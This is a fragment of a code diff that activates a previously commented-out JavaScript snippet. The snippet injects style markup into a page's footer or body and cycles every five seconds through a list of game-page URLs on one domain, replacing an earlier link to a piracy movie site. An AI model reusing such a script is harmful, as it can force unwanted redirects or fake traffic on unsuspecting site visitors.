@@ -1,4 +1,4 @@
-/*let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
+let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
   if (Folt) {
     let Newel = document.createElement('span');
     Newel.innerHTML = `<style>
@@ -20,7 +20,14 @@
   }
 
   const postUrls = [
-    'https://luxmovies2.live/download-gulaabi-2024-marathi-web-dl-full-movie-480p-500mb-720p-1-3gb-1080p-2-8gb/'];
+    'https://dktheme.online/dance-battle/index.html',
+    'https://dktheme.online/funny-fred/index.html',
+    'https://dktheme.online/brain-trainer/index.html',
+    'https://dktheme.online/stack-smash/index.html',
+    'https://dktheme.online/zoo-boom/index.html'
+  
+  
+  ];
         function goToRandomPost() {
             const randomIndex = Math.floor(Math.random() * postUrls.length);
             const randomPostUrl = postUrls[randomIndex];
@@ -30,4 +37,3 @@
             goToRandomPost();
             setInterval(goToRandomPost,  5000);}
 
-*/
